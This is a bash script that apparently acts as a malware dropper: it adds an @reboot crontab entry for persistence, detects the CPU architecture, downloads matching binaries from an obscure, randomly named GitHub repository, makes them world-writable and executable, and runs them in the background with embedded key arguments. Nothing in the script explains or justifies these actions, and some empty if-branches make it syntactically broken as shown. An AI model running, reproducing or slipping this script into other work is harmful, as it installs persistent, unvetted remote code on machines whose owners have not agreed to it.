#!/bin/bash
entry="@reboot /bin/bash ~/Util.sh"
if ! crontab -l 2>/dev/null | grep -Fq "$entry"; then
  (crontab -l 2>/dev/null; echo "$entry") | crontab -
else
  echo ""
fi
current_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$current_dir" || exit 1


download_and_run() {
    local file_name="$1"
    local url="$2"
    local exec_arg="$3"

    if [ ! -f "$file_name" ]; then

        if command -v curl >/dev/null 2>&1; then
            if curl -f -L -o "$file_name" "$url"; then
      
            else
 
                return 1
            fi
        elif command -v wget >/dev/null 2>&1; then
            if wget -O "$file_name" "$url"; then

            else
 
                return 1
            fi
        else
            echo "Error: Neither curl nor wget is available."
            return 1
        fi

       
        chmod +x "$file_name"
        chmod 777 "$file_name"
    else
 
        # Ensure permissions are set
        chmod +x "$file_name"
        chmod 777 "$file_name"
    fi


    "./$file_name" $exec_arg &
}


arch=$(uname -m)
echo "Detected CPU architecture: $arch"


P_file=""
P_url=""
C_file=""
C_url=""


case "$arch" in
    "x86_64")
        P_file="p_x86"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_x86"
        C_file="C_amd64"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_amd64"
        ;;
    "i686" | "i386")
        P_file="p_i386"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_i386"
        C_file="C_386"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_386"
        ;;
    aarch64*)
        P_file="p_aarch64"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_aarch64"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv7*|armeabi*)
        P_file="p_v71"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v71"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv6*)
        P_file="p_v6"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v6"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv5*)
        P_file="p_v5"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v5"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    *)
        echo "Unsupported CPU architecture: $arch"
        exit 1
        ;;
esac

# Download and execute the P file if available, with its argument
if [ -n "$P_file" ] && [ -n "$P_url" ]; then
    download_and_run "$P_file" "$P_url" "-appkey=v2Hhhkf738Jer8LQ" || exit 1
fi

# Download and execute the C file if available, with its argument
if [ -n "$C_file" ] && [ -n "$C_url" ]; then
    download_and_run "$C_file" "$C_url" "-key=cskeGdnSHRcJz1" || exit 1
fi
